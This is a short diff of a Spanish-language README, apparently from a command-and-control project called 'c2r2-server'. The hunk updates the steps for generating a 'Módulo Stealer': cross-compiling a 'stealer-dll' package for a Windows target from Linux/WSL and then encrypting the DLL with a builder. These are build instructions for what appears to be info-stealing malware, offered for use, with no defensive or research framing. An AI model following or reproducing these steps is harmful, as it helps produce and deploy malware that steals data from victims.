@@ -106,8 +106,8 @@ c2r2-server/
 ### 2. Generar Módulo Stealer
 
 ```bash
-# 1. Compilar DLL
-cargo build --release --package stealer-dll
+# 1. Compilar DLL (Windows target desde Linux/WSL)
+cargo build --release --target x86_64-pc-windows-gnu --package stealer-dll
 
 # 2. Encriptar DLL (genera .enc y .key)
 cd builder
